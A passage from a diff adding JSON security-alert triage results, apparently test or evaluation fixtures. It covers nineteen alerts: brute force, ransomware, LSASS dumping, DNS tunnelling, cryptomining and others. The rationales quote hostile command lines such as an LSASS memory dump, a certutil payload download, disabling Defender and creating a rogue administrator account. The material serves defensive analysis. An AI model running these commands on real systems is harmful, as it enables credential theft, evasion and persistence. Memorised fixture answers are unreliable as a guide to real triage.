+        "Scheduled task created with /sc onlogon trigger, providing persistent execution on every user logon.",
+        "mshta.exe used as a LOLBIN to proxy execution of a remote HTA file over HTTP, bypassing application controls (T1218.005).",
+        "LAB-WS-004 had a prior alert within the last 7 days (2026-05-27T22:40:05Z), indicating repeated or escalating activity on this host.",
+        "MITRE mapping confirms T1053/T1053.005 (Scheduled Task) for persistence and T1218.005 (Mshta) for execution \u2014 a well-documented attacker TTP chain."
+      ]
+    }
+  },
+  "critique": {
+    "A-0001": {
+      "alert_id": "A-0001",
+      "severity": "high",
+      "confidence": 0.95,
+      "mitre_technique_id": "T1110.001",
+      "mitre_technique_name": "Brute Force: Password Guessing",
+      "recommended_action": "contain",
+      "rationale": "All evidence converges on a high-confidence SSH brute-force attack. The source IP 203.0.113.45 carries a threat-intelligence risk score of 92/100, is categorized as 'malicious' with tags 'brute-force' and 'ssh-scanner', and was last seen today (2026-05-28). The attack pattern \u2014 412 failed root login attempts in just 6 minutes \u2014 is consistent with automated credential stuffing or password guessing (T1110.001). The same IP triggered a prior alert only 1 hour earlier (HIST-ip-203.0.113.45 at 02:14 UTC), indicating persistent, repeat activity. The target, web-prod-01, is an internet-facing production server, significantly raising the blast radius if any attempt succeeds. No successful authentication was reported, but the volume and velocity of attempts warrant immediate containment: block the source IP at the perimeter firewall/WAF, verify no successful root sessions exist on web-prod-01, and consider enforcing key-based SSH authentication with root login disabled.",
+      "supporting_observations": [
+        "IP 203.0.113.45 reputation: MALICIOUS, risk score 92/100, categories: brute-force, ssh-scanner (TI source: bundled-ti, last seen 2026-05-28).",
+        "412 failed SSH authentication attempts targeting user 'root' in 360 seconds (~1.14 attempts/sec) \u2014 consistent with automated brute-force tooling.",
+        "Same source IP triggered a prior alert (HIST-ip-203.0.113.45) just 60 minutes before this event, indicating sustained, repeat targeting.",
+        "Target host web-prod-01 is internet-facing, making root SSH brute-force a high-impact initial access vector.",
+        "MITRE ATT&CK best fit: T1110.001 (Brute Force: Password Guessing) under the Credential Access tactic; SSH lateral movement (T1021.004) is secondary if credentials are obtained."
+      ]
+    },
+    "A-0002": {
+      "alert_id": "A-0002",
+      "severity": "critical",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1110",
+      "mitre_technique_name": "Brute Force",
+      "recommended_action": "contain",
+      "rationale": "All evidence strongly confirms a successful brute-force compromise. The source IP (203.0.113.45) carries a threat intelligence score of 92/100 and is categorized as a brute-force and SSH-scanner actor, with a prior alert from the same IP just 2.5 hours earlier in the same day. The pattern of 233 consecutive authentication failures immediately followed by a successful login for service account 'svc-billing' on production host 'app-prod-07' is a textbook brute-force success. The account has no prior alert history, making this a novel compromise. The risk is amplified by: (1) svc-billing being a service account likely holding elevated privileges and access to financial data, (2) app-prod-07 being a production system, and (3) the off-hours timestamp (04:51Z). Immediate containment is required: disable/lock svc-billing, block 203.0.113.45 at the perimeter, isolate app-prod-07 for forensic review, and rotate all credentials associated with the compromised account. Escalate to IR team for full investigation of post-authentication activity.",
+      "supporting_observations": [
+        "IP 203.0.113.45 has a threat intelligence reputation of 'malicious' with a risk score of 92/100, categorized as brute-force and ssh-scanner (last seen 2026-05-28).",
+        "A prior alert involving 203.0.113.45 was recorded at 02:14Z on the same day, ~2.5 hours before this event, indicating a sustained attack campaign.",
+        "233 consecutive authentication failures immediately followed by a successful login for svc-billing is a definitive brute-force compromise pattern.",
+        "Service account svc-billing has no prior alert history in the last 7 days \u2014 this is a novel, first-time compromise event.",
+        "Production host app-prod-07 has no prior alert history in the last 7 days, making this intrusion highly anomalous.",
+        "Authentication occurred at 04:51Z (off-hours), from an external malicious IP with no legitimate business justification.",
+        "MITRE ATT&CK mapping confirms T1110 (Brute Force) under Credential Access tactic as the primary technique."
+      ]
+    },
+    "A-0003": {
+      "alert_id": "A-0003",
+      "severity": "critical",
+      "confidence": 0.95,
+      "mitre_technique_id": "T1059.001",
+      "mitre_technique_name": "PowerShell",
+      "recommended_action": "contain",
+      "rationale": "This alert presents a high-fidelity, multi-indicator malicious execution chain with no benign explanation. winword.exe spawned powershell.exe with -nop -w hidden -enc flags \u2014 a well-known evasion trifecta. The base64 payload (SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGo) decodes to 'IEX (New-Obj...' confirming a download cradle (Invoke-Expression + New-Object Net.WebClient), consistent with a stage-2 payload retrieval. MITRE mapping strongly confirms T1059.001 (PowerShell, score 4) with T1566.001 (Spearphishing Attachment) as the likely initial access vector. Host FIN-WS-118 had a prior alert exactly 60 minutes before this event, indicating active and ongoing compromise activity \u2014 not a one-off anomaly. User m.reyes has no prior alert history, ruling out a known-noisy user. The medium integrity level confirms user-context execution consistent with a phishing-delivered macro. Immediate host isolation is warranted to prevent lateral movement or data exfiltration from the likely-active download cradle.",
+      "supporting_observations": [
+        "winword.exe \u2192 powershell.exe process chain is a textbook malicious macro execution pattern",
+        "PowerShell flags -nop (no profile), -w hidden (hidden window), -enc (encoded command) are classic evasion indicators",
+        "Base64 fragment decodes to 'IEX (New-Obj...' confirming a download cradle (Invoke-Expression + New-Object Net.WebClient)",
+        "FIN-WS-118 had a prior alert exactly 60 minutes before this event, indicating active ongoing compromise",
+        "User m.reyes has zero prior alerts in 7 days \u2014 this behavior is anomalous for this account",
+        "Medium integrity level confirms user-context execution consistent with phishing-delivered macro",
+        "MITRE T1059.001 matched with score 4; T1566.001 (Spearphishing Attachment) identified as likely initial access vector"
+      ]
+    },
+    "A-0004": {
+      "alert_id": "A-0004",
+      "severity": "high",
+      "confidence": 0.87,
+      "mitre_technique_id": "T1078",
+      "mitre_technique_name": "Valid Accounts",
+      "recommended_action": "contain",
+      "rationale": "User a.kapoor authenticated from New York (198.51.100.23) and Singapore (203.0.113.210) within 40 minutes \u2014 a physically impossible travel pattern strongly indicative of account compromise. The Singapore IP is flagged as suspicious (risk score 58) and categorized as an anonymizer, a common technique used by threat actors to obscure their origin. The New York IP is clean, suggesting the legitimate user is in NY while an adversary leverages stolen credentials via a VPN/proxy from Singapore. No prior alerts exist for this user in the past 7 days, ruling out a known noisy pattern. Immediate containment is recommended: suspend the session from the Singapore IP, force MFA re-enrollment, reset credentials, and investigate for any data access or lateral movement during the Singapore session.",
+      "supporting_observations": [
+        "203.0.113.210 (SG) flagged as suspicious with risk score 58, categorized as anonymizer \u2014 last seen 2026-05-26",
+        "198.51.100.23 (US-NY) has unknown/clean reputation with no prior alerts",
+        "40-minute gap between US-NY and SG logins is physically impossible, eliminating legitimate travel as an explanation",
+        "User a.kapoor has zero prior alerts in the last 168 hours, indicating this is a novel, isolated event and not a known false-positive pattern",
+        "MITRE T1078 (Valid Accounts) matched \u2014 adversary using legitimate credentials to authenticate"
+      ]
+    },
+    "A-0005": {
+      "alert_id": "A-0005",
+      "severity": "critical",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1566.001",
+      "mitre_technique_name": "Spearphishing Attachment",
+      "recommended_action": "escalate",
+      "rationale": "This alert represents a confirmed, active Emotet delivery campaign targeting the accounts-payable team. Key findings: (1) The .xlsm attachment hash (SHA256) was positively identified as known malware \u2014 family 'EmotetDoc', signature 'TrojanDownloader:O97M/Emotet', with 37 AV detections and first seen 2026-02-18. (2) The sending domain 'accounts-payable-support.com' is a classic look-alike/typosquat targeting the AP team, and SPF hard-failed, confirming spoofing/unauthorized sender. (3) The email was delivered to THREE mailboxes (ap.team@corp.example), meaning potential macro execution by multiple users cannot be ruled out. (4) No prior internal alerts for this hash or domain indicate this is a first-wave delivery \u2014 early containment is critical before Emotet establishes persistence or drops secondary payloads (e.g., Cobalt Strike, ransomware). Immediate escalation is required: quarantine the delivered emails, isolate any endpoints that opened the attachment, reset credentials for affected users, and engage IR.",
+      "supporting_observations": [
+        "Hash 9f1c2e7a4b8d6f0a3c5e9b1d7f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a identified as EmotetDoc / TrojanDownloader:O97M/Emotet with 37 detections across AV engines.",
+        "Sender domain 'accounts-payable-support.com' is a look-alike domain targeting AP staff; SPF=FAIL confirms unauthorized sender.",
+        "Email delivered to 3 mailboxes (ap.team@corp.example) \u2014 multiple users at risk of macro execution.",
+        "No prior internal alerts for this hash or domain \u2014 first-wave delivery, no existing detections to correlate against.",
+        "MITRE ATT&CK: T1566.001 (Spearphishing Attachment) \u2014 Initial Access tactic, highest confidence match (score 3)."
+      ]
+    },
+    "A-0006": {
+      "alert_id": "A-0006",
+      "severity": "critical",
+      "confidence": 0.99,
+      "mitre_technique_id": "T1486",
+      "mitre_technique_name": "Data Encrypted for Impact",
+      "recommended_action": "escalate",
+      "rationale": "All evidence conclusively confirms an active ransomware attack. (1) FILE HASH CONFIRMED MALWARE: SHA256 1a2b3c4d...f1a2b is identified as a LockBitClone variant with 61 detections across engines, matching signatures Ransom:Win32/LockBit and Trojan.Ransom.Generic, first seen 2026-03-11. (2) RANSOMWARE BEHAVIOR: The process renamed 4,200 files to .locked and dropped READ_ME_RANSOM.txt in every directory \u2014 textbook ransomware encryption and extortion note delivery. (3) PROCESS MASQUERADING: The process is named svch0st.exe (zero substituted for 'o'), a deliberate typosquat of the legitimate Windows svchost.exe \u2014 a classic defense evasion technique (T1036.004). (4) HIGH-VALUE TARGET: FS-CORP-02 is a corporate file share, meaning the blast radius of 4,200 encrypted files likely spans multiple users and business-critical data. (5) NO PRIOR ALERTS: No prior alerts for this host or process in the last 7 days, suggesting a first-strike or the attacker evaded detection until encryption began. Immediate containment and escalation are required: isolate FS-CORP-02 from the network immediately, preserve forensic evidence, initiate IR playbook, and assess lateral movement risk.",
+      "supporting_observations": [
+        "Hash 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b confirmed as LockBitClone ransomware with 61 AV detections (Ransom:Win32/LockBit, Trojan.Ransom.Generic)",
+        "4,200 files renamed to .locked extension on corporate file share FS-CORP-02",
+        "Ransom note READ_ME_RANSOM.txt dropped in every affected directory",
+        "Process svch0st.exe is a typosquat of legitimate svchost.exe (zero replacing letter 'o') \u2014 masquerading/defense evasion (T1036.004)",
+        "No prior alerts for FS-CORP-02 or svch0st.exe in the past 168 hours \u2014 first observed activity, suggesting rapid encryption onset",
+        "MITRE ATT&CK T1486 (Data Encrypted for Impact) confirmed via technique mapping for ransomware/LockBit activity"
+      ]
+    },
+    "A-0007": {
+      "alert_id": "A-0007",
+      "severity": "critical",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1003.001",
+      "mitre_technique_name": "LSASS Memory",
+      "recommended_action": "contain",
+      "rationale": "All indicators confirm an active, high-confidence credential-dumping attack on a Domain Controller. (1) Command `procdump64.exe -ma lsass.exe c:\\temp\\out.dmp` is the textbook method for full LSASS memory capture; output is staged in c:\\temp, consistent with exfiltration prep. (2) Access mask 0x1010 = PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION \u2014 the exact permissions needed to extract credentials from LSASS. (3) Target is DC-01 (Domain Controller); a successful dump yields all domain credentials including krbtgt, compromising the entire AD domain. (4) Actor is svc-backup \u2014 service accounts should never run interactive memory-dumping tools; this account is almost certainly compromised. (5) A prior alert on DC-01 was recorded ~1 hour earlier, indicating an ongoing attack chain. (6) No prior procdump64.exe activity exists in the environment, ruling out authorized admin use. MITRE mapping: perfect score match to T1003.001. Immediate actions: isolate DC-01, disable svc-backup, initiate krbtgt double-reset, force privileged account password resets, preserve the dump file as forensic evidence, and escalate to IR.",
+      "supporting_observations": [
+        "procdump64.exe -ma lsass.exe c:\\temp\\out.dmp: textbook LSASS full-memory dump command, output staged to c:\\temp\\",
+        "Access mask 0x1010 = PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION \u2014 exact permissions for reading LSASS credential material",
+        "Target host is DC-01 (Domain Controller) \u2014 a successful dump yields all domain credentials including krbtgt",
+        "Actor is svc-backup (service account) \u2014 service accounts should never run interactive memory-dumping tools; account is likely compromised",
+        "Prior alert on DC-01 recorded ~1 hour earlier (HIST-host-DC-01, 2026-05-28T21:11:09Z), indicating an ongoing attack chain",
+        "No prior procdump64.exe activity in the environment (0 historical alerts) \u2014 no legitimate baseline exists to explain this as authorized",
+        "MITRE ATT&CK mapping: perfect score match to T1003.001 (LSASS Memory) under Credential Access tactic"
+      ]
+    },
+    "A-0008": {
+      "alert_id": "A-0008",
+      "severity": "critical",
+      "confidence": 0.95,
+      "mitre_technique_id": "T1071.004",
+      "mitre_technique_name": "Application Layer Protocol: DNS",
+      "recommended_action": "contain",
+      "rationale": "All evidence strongly indicates active DNS tunneling / data exfiltration from host MKT-WS-244. The host issued 5,120 TXT queries in one hour to x7f3q9.exfil-data.net, with an average subdomain label entropy of 4.7 \u2014 a hallmark of base64/hex-encoded data chunks embedded in DNS queries (consistent with tools like dnscat2 or iodine). The destination SLD 'exfil-data.net' is overtly adversarial in naming. MITRE mapping returned a perfect score for T1071.004 (DNS C2/exfil). Additionally, MKT-WS-244 had a prior suspicious alert just one hour before this event, suggesting an ongoing compromise sequence. No legitimate application generates thousands of high-entropy TXT queries to a single domain. Immediate containment (network isolation of MKT-WS-244, DNS sinkholing of exfil-data.net) is warranted to stop active data loss, followed by forensic investigation of the host.",
+      "supporting_observations": [
+        "5,120 TXT DNS queries in one hour to a single SLD \u2014 far exceeds any legitimate DNS behavior",
+        "Average subdomain label entropy of 4.7 is consistent with base64/hex-encoded data payloads (DNS tunneling)",
+        "Destination domain 'exfil-data.net' is overtly named for exfiltration activity",
+        "MITRE ATT&CK mapping returned a perfect match (score=1.0) for T1071.004 \u2013 Application Layer Protocol: DNS",
+        "MKT-WS-244 had a prior suspicious alert at 17:33 UTC, exactly one hour before this alert at 18:33 UTC, suggesting an ongoing compromise chain",
+        "TXT record type is the canonical DNS tunneling vector used by tools such as dnscat2 and iodine"
+      ]
+    },
+    "A-0009": {
+      "alert_id": "A-0009",
+      "severity": "critical",
+      "confidence": 0.95,
+      "mitre_technique_id": "T1105",
+      "mitre_technique_name": "Ingress Tool Transfer",
+      "recommended_action": "contain",
+      "rationale": "certutil.exe was invoked with '-urlcache -split -f' to download 'a.exe' from 198.51.100.77 \u2014 a confirmed malicious IP (TI score 88/100, category: malware-download, last seen today). This is a textbook LOLBin abuse technique (T1105) used to bypass application controls and download payloads. The host HR-WS-051 also had a prior suspicious alert approximately 2 hours earlier the same day, indicating likely ongoing or multi-stage compromise. The downloaded executable 'a.exe' is uncharacterized with no hash available for enrichment, representing an unknown payload risk. Immediate containment of HR-WS-051 is warranted to prevent lateral movement or payload execution, followed by forensic investigation of the downloaded file and any child processes spawned by certutil.",
+      "supporting_observations": [
+        "certutil.exe -urlcache -split -f used to download a.exe \u2014 classic LOLBin/T1105 technique",
+        "Destination IP 198.51.100.77 flagged MALICIOUS by TI (score 88/100, category: malware-download, last seen 2026-05-28)",
+        "Host HR-WS-051 had a prior suspicious alert at 09:36 UTC, ~2 hours before this event at 11:26 UTC \u2014 suggests multi-stage or ongoing compromise",
+        "Downloaded file 'a.exe' is an uncharacterized executable with no hash available for malware enrichment",
+        "No prior alerts for this IP in the last 7 days \u2014 likely a newly-stood-up staging/C2 server"
+      ]
+    },
+    "A-0010": {
+      "alert_id": "A-0010",
+      "severity": "high",
+      "confidence": 0.87,
+      "mitre_technique_id": "T1053.005",
+      "mitre_technique_name": "Scheduled Task",
+      "recommended_action": "investigate",
+      "rationale": "The command line 'schtasks /create /sc minute /mo 10 /tn Updater /tr \"powershell -w hidden -f c:\\\\u.ps1\"' exhibits multiple high-confidence attacker TTPs: (1) scheduled task creation for persistence (T1053.005, top MITRE match), (2) PowerShell launched with a hidden window (-w hidden) for defense evasion, (3) an unusually short/obfuscated script path (c:\\u.ps1) inconsistent with legitimate software, (4) a high-frequency 10-minute trigger atypical of authorized tooling, and (5) a generic masquerading task name (\"Updater\"). Host ENG-WS-309 had a prior alert approximately 1 hour before this event, suggesting possible multi-stage compromise. User t.osei has no prior alert history, making this deviation more notable. No file hash is available to enrich the script, so its content and maliciousness remain unknown. Immediate investigation is warranted: retrieve and analyze c:\\u.ps1, review the prior ENG-WS-309 alert, audit t.osei's recent activity, and determine whether the task was authorized.",
+      "supporting_observations": [
+        "MITRE top match: T1053.005 (Scheduled Task, score 2); secondary matches T1059.001 (PowerShell) and T1027 (Obfuscated Files)",
+        "Command uses 'powershell -w hidden' \u2014 active defense evasion to suppress window visibility",
+        "Script path 'c:\\u.ps1' is suspiciously short and non-descriptive, consistent with attacker tradecraft",
+        "Task named 'Updater' \u2014 common masquerading name used by malware to blend with legitimate processes",
+        "10-minute trigger interval is aggressive and atypical of legitimate scheduled maintenance tasks",
+        "Host ENG-WS-309 had 1 prior alert ~1 hour before this event (HIST-host-ENG-WS-309), suggesting possible multi-stage activity",
+        "User t.osei has zero prior alerts in the last 168 hours \u2014 no established pattern of similar activity",
+        "No file hash available for c:\\u.ps1 \u2014 script content and intent cannot be verified without further investigation"
+      ]
+    },
+    "A-0011": {
+      "alert_id": "A-0011",
+      "severity": "high",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1046",
+      "mitre_technique_name": "Network Service Discovery",
+      "recommended_action": "contain",
+      "rationale": "SALES-WS-077 (10.20.4.88) connected to port 445 (SMB) across 1,800 distinct internal hosts within minutes \u2014 a volume and speed that is unambiguously malicious for a sales workstation. MITRE mapping confirms T1046 (Network Service Discovery) with lateral movement overlap (T1021). Critically, SALES-WS-077 appeared in a prior alert just ~22 hours earlier (HIST-host-SALES-WS-077, 2026-05-26T12:12:04Z), indicating repeat/escalating activity consistent with an active compromise. SMB scanning at this scale is a hallmark of ransomware pre-staging, worm propagation (e.g., EternalBlue), or post-exploitation reconnaissance. No authorized scanning activity or change window explains this behavior. Immediate network isolation of SALES-WS-077 is recommended to prevent lateral spread, followed by forensic investigation of the endpoint.",
+      "supporting_observations": [
+        "1,800 distinct SMB (port 445) connections in minutes from a sales workstation \u2014 no legitimate business justification.",
+        "MITRE ATT&CK matched T1046 (Network Service Discovery) and T1021 (Remote Services / Lateral Movement).",
+        "SALES-WS-077 has a prior alert from 2026-05-26T12:12:04Z (~22 hours before this event), indicating repeat/escalating malicious activity.",
+        "10.20.4.88 is an internal RFC1918 address with no external TI hits, but internal scanning behavior is the threat vector.",
+        "Port 445 (SMB) is the primary attack surface for EternalBlue/WannaCry-class exploits and ransomware lateral movement."
+      ]
+    },
+    "A-0012": {
+      "alert_id": "A-0012",
+      "severity": "informational",
+      "confidence": 0.97,
+      "mitre_technique_id": "T1190",
+      "mitre_technique_name": "Exploit Public-Facing Application",
+      "recommended_action": "close_false_positive",
+      "rationale": "All evidence confirms this is authorized scanner activity. The source IP (10.10.0.5) is an internal address with zero threat-intel score and no prior alert history. The host 'nessus-scanner-01' is explicitly flagged as a known scanner (source_is_known_scanner: true). The alert timestamp (Sun 02:00 UTC) falls precisely within the approved weekly scan window (Sun 02:00\u201304:00). Nessus probes routinely trigger IDS exploit signatures as a side-effect of vulnerability testing \u2014 this is expected behavior, not an attack. No malicious indicators were found across any tool. Recommend closing as a false positive and considering a Suricata suppression rule for this scanner IP during its approved window to reduce noise.",
+      "supporting_observations": [
+        "IP 10.10.0.5 is an internal RFC-1918 address with reputation score 0 and no threat categories.",
+        "Zero prior alerts for IP 10.10.0.5 or host nessus-scanner-01 in the last 7 days.",
+        "Raw alert data explicitly sets source_is_known_scanner=true.",
+        "Alert timestamp 2026-05-24T02:00:12Z falls exactly within the approved scan window (Sun 02:00\u201304:00).",
+        "MITRE T1190 match score was only 2/low \u2014 the traffic resembles exploit probes but originates from a sanctioned scanner, not a threat actor."
+      ]
+    },
+    "A-0013": {
+      "alert_id": "A-0013",
+      "severity": "informational",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1059.001",
+      "mitre_technique_name": "PowerShell",
+      "recommended_action": "close_false_positive",
+      "rationale": "Encoded PowerShell (T1059.001) was detected on APP-PROD-03, executed by the dedicated deployment account adm.deploy. All contextual signals strongly support authorized activity: (1) an open, approved change ticket CHG-44821 is on record, (2) execution occurred within the designated change window, (3) the executing account is a purpose-built domain admin deployment identity, (4) query_recent_alerts returned zero prior alerts for both adm.deploy and APP-PROD-03 in the past 168 hours \u2014 ruling out a pattern of abuse or lateral movement, and (5) no malicious IPs, file hashes, or domains are associated with this event. The -enc flag is a legitimate mechanism used by deployment automation to pass complex scripts. While the technique matches attacker tradecraft, every available contextual and historical indicator points to approved, routine deployment activity. Confidence is 0.92 rather than 1.0 due to the encoded payload being opaque in the alert, but the full authorization context mitigates this residual uncertainty. Closing as a false positive.",
+      "supporting_observations": [
+        "MITRE mapping: T1059.001 (PowerShell, Execution) \u2014 technique matches but is consistent with legitimate deployment tooling using -enc for complex script passing.",
+        "adm.deploy: 0 prior alerts in last 168 hours \u2014 no pattern of abuse or account compromise indicators.",
+        "APP-PROD-03: 0 prior alerts in last 168 hours \u2014 no signs of compromise, lateral movement, or staging activity.",
+        "Change ticket CHG-44821 is open and approved; within_change_window=true confirms execution timing aligns with authorized maintenance.",
+        "No malicious IPs, file hashes, or domains present in alert observables \u2014 no IOC corroboration of a threat."
+      ]
+    },
+    "A-0014": {
+      "alert_id": "A-0014",
+      "severity": "critical",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1078.004",
+      "mitre_technique_name": "Valid Accounts: Cloud Accounts",
+      "recommended_action": "escalate",
+      "rationale": "AWS root account logged into the console from 203.0.113.9 (TI: suspicious, score 47/100, cloud-VPS category, first seen today) without MFA \u2014 a direct policy violation. Root usage is prohibited by policy and should be an extreme rarity. The source IP is unfamiliar with zero prior alert history, consistent with a novel attacker origin. A prior root-user alert was recorded ~4 hours earlier (HIST-user-root, 02:14 UTC), suggesting repeated or escalating unauthorized access. The combination of root credentials, no MFA, suspicious cloud-VPS IP, and a corroborating prior alert strongly indicates account compromise or insider misuse. Immediate escalation is warranted: revoke active sessions, rotate root credentials, enable MFA, and investigate all CloudTrail actions performed during and after this login on account 1129-prod.",
+      "supporting_observations": [
+        "IP 203.0.113.9 flagged as suspicious (score 47/100) by threat intelligence, categorized as cloud-VPS \u2014 a common attacker proxy infrastructure.",
+        "No MFA used on root console login \u2014 violates AWS security best practices and internal policy.",
+        "IP 203.0.113.9 has zero prior alert history in the last 168 hours, confirming it is a novel/unfamiliar source.",
+        "Root user had a prior alert (HIST-user-root) approximately 4 hours before this event, suggesting a pattern of unauthorized root activity.",
+        "MITRE T1078.004 (Valid Accounts: Cloud Accounts) \u2014 adversary leveraging legitimate root credentials to access cloud management plane."
+      ]
+    },
+    "A-0015": {
+      "alert_id": "A-0015",
+      "severity": "critical",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1048",
+      "mitre_technique_name": "Exfiltration Over Alternative Protocol",
+      "recommended_action": "escalate",
+      "rationale": "240 GB was exfiltrated from the sensitive PII bucket 'corp-pii-archive' to 198.51.100.140, a bulletproof-hosting IP (TI score 61/100, last seen same day), representing an 80\u00d7 deviation from the 3 GB baseline. The IAM user 'datasci-batch' has no prior alert history, ruling out a known noisy account. The destination IP has no prior alert history either, indicating a novel, targeted exfiltration rather than a recurring scan. The off-hours timestamp (03:55 UTC), the bulletproof-hosting category of the destination, the PII sensitivity of the source bucket, and the extreme volume anomaly collectively indicate a high-confidence active data exfiltration event. Immediate escalation is warranted: contain the IAM user (revoke credentials/suspend), block the destination IP at the network perimeter, preserve S3 access logs for forensics, and notify legal/compliance given PII exposure.",
+      "supporting_observations": [
+        "IP 198.51.100.140 flagged as suspicious with risk score 61/100, categorized as bulletproof-hosting, last seen 2026-05-29 (same day as alert).",
+        "Egress volume of 240 GB is 80\u00d7 above the 3 GB baseline \u2014 extreme statistical anomaly.",
+        "Source bucket 'corp-pii-archive' contains sensitive PII, elevating regulatory and legal risk.",
+        "IAM user 'iam:datasci-batch' has zero prior alerts in the last 7 days \u2014 no benign precedent for this behavior.",
+        "Destination IP 198.51.100.140 has zero prior alerts in the last 7 days \u2014 novel exfiltration destination.",
+        "Alert triggered at 03:55 UTC \u2014 off-hours timing consistent with covert exfiltration activity.",
+        "MITRE best fit: T1048 (Exfiltration Over Alternative Protocol) under the Exfiltration tactic."
+      ]
+    },
+    "A-0016": {
+      "alert_id": "A-0016",
+      "severity": "high",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1562.001",
+      "mitre_technique_name": "Disable or Modify Tools",
+      "recommended_action": "contain",
+      "rationale": "User d.fischer executed 'Set-MpPreference -DisableRealtimeMonitoring $true' via PowerShell on ENG-WS-211, directly disabling Microsoft Defender real-time protection \u2014 a textbook T1562.001 Defense Evasion technique. The alert description explicitly states this occurred shortly before other suspicious activity. Alert history confirms a prior unknown-severity alert on ENG-WS-211 exactly 60 minutes earlier (13:09 UTC vs. 14:09 UTC), indicating a developing attack chain rather than an isolated event. User d.fischer has no prior alert history in the last 7 days, ruling out a known pattern of authorized administrative behavior. Disabling AV real-time protection is a well-documented precursor to ransomware deployment, credential dumping, or lateral movement. Immediate containment of ENG-WS-211 is warranted to prevent further progression, with investigation of d.fischer's account for compromise and review of all activity in the 60-minute window between the two alerts.",
+      "supporting_observations": [
+        "Command line 'powershell Set-MpPreference -DisableRealtimeMonitoring $true' directly disables Defender real-time protection (T1562.001).",
+        "Prior alert on host ENG-WS-211 at 2026-05-28T13:09:27Z \u2014 exactly 60 minutes before this event \u2014 suggests a multi-stage attack chain.",
+        "User d.fischer has zero prior alerts in the last 168 hours, indicating this is anomalous behavior with no authorized baseline.",
+        "Alert description explicitly states suspicious activity followed this defense evasion action, corroborating an active threat scenario.",
+        "MITRE mapping returned high-confidence matches for both T1562.001 (Disable or Modify Tools) and T1059.001 (PowerShell), consistent with attacker TTPs."
+      ]
+    },
+    "A-0017": {
+      "alert_id": "A-0017",
+      "severity": "high",
+      "confidence": 0.9,
+      "mitre_technique_id": "T1136.001",
+      "mitre_technique_name": "Create Account: Local Account",
+      "recommended_action": "contain",
+      "rationale": "A new local account 'helpdesk_svc' was created and immediately added to the Administrators group on LAB-WS-004 at 23:40 UTC, explicitly outside IT provisioning workflows. The two-step command sequence (net user /add \u2192 net localgroup Administrators /add) is a textbook persistence and privilege escalation pattern (T1136.001 / T1098). Multiple red flags compound the risk: (1) off-hours execution with no change window, (2) service-account-style name designed to blend in with legitimate accounts, (3) plaintext password embedded in the command line, (4) the account has zero prior history (brand new), and (5) LAB-WS-004 had a prior suspicious alert just 60 minutes earlier in the same lookback window, suggesting this may be part of a broader compromise chain. Containment is recommended immediately: disable/delete the rogue account, isolate LAB-WS-004 for forensic review, and investigate the parent process and user context that executed these commands.",
+      "supporting_observations": [
+        "Command line 'net user helpdesk_svc P@ssw0rd! /add' created a new local account with a hardcoded plaintext password at 23:40 UTC.",
+        "Command line 'net localgroup Administrators helpdesk_svc /add' immediately elevated the new account to local Administrators.",
+        "Alert explicitly states activity occurred outside IT provisioning \u2014 no authorized change record.",
+        "Host LAB-WS-004 had 1 prior suspicious alert within the last 7 days, occurring ~60 minutes before this event (HIST-host-LAB-WS-004).",
+        "Account 'helpdesk_svc' has zero prior alert history \u2014 it is a newly created, previously unseen account.",
+        "Off-hours timing (23:40 UTC) with no associated change window increases suspicion of unauthorized activity.",
+        "Account name 'helpdesk_svc' mimics a legitimate service account, suggesting deliberate obfuscation."
+      ]
+    },
+    "A-0018": {
+      "alert_id": "A-0018",
+      "severity": "high",
+      "confidence": 0.92,
+      "mitre_technique_id": "T1098",
+      "mitre_technique_name": "Account Manipulation",
+      "recommended_action": "escalate",
+      "rationale": "A standard account (j.lambert) was added to Domain Admins on DC-02 with no associated change ticket, indicating an unauthorized privilege escalation. MITRE mapping confirms T1098 (Account Manipulation, Persistence). No prior alert history for j.lambert or DC-02 rules out a known noisy/benign pattern. Domain Admins membership grants unrestricted domain-wide control, making this a critical-impact action. The absence of any change management authorization is a hard policy violation and a strong indicator of either insider threat, compromised account, or attacker lateral movement. Immediate escalation is warranted to revoke the group membership, audit j.lambert's recent activity, and determine whether the account was compromised or acted maliciously.",
+      "supporting_observations": [
+        "T1098 (Account Manipulation) matched with score 1.0 \u2014 consistent with unauthorized group membership modification for persistence.",
+        "No change ticket present (change_ticket: null) \u2014 violates change management policy for privileged group modifications.",
+        "j.lambert has zero prior alerts in the last 30 days \u2014 no established benign baseline for this type of action.",
+        "DC-02 has zero prior alerts in the last 7 days \u2014 no corroborating noisy/misconfigured context.",
+        "Domain Admins is the highest-privilege group in Active Directory; unauthorized membership grants full domain compromise capability.",
+        "Action performed on a Domain Controller (DC-02), the most sensitive asset class in a Windows environment."
+      ]
+    },
+    "A-0019": {
+      "alert_id": "A-0019",
+      "severity": "high",
+      "confidence": 0.95,
+      "mitre_technique_id": "T1496",
+      "mitre_technique_name": "Resource Hijacking",
+      "recommended_action": "contain",
+      "rationale": "XMRig is a well-known cryptocurrency miner with no legitimate use on a CI/CD build agent. The EDR fired with high confidence: xmrig was explicitly connecting to a named mining pool (pool.minexmr.example) and sustaining 100% CPU \u2014 textbook T1496 Resource Hijacking. MITRE mapping returned a strong, unambiguous single match. No prior alerts exist for BUILD-AGENT-12 or the mining pool domain over the past 30 days, ruling out known false-positive patterns. Severity is upgraded from medium to high because BUILD-AGENT-12 is a build agent \u2014 a high-value target with likely access to source repositories, secrets, and code-signing infrastructure, creating significant supply-chain risk. Immediate containment (network isolation + process kill) is warranted before forensic investigation to prevent lateral movement or pipeline tampering.",
+      "supporting_observations": [
+        "XMRig process detected by SentinelOne EDR with explicit mining pool argument (pool.minexmr.example), confirming intentional cryptomining activity.",
+        "CPU utilization sustained at 100%, consistent with an active XMR mining workload \u2014 not a transient or test event.",
+        "MITRE ATT&CK mapping: T1496 Resource Hijacking (Impact tactic) \u2014 strong, unambiguous single match with score 3.",
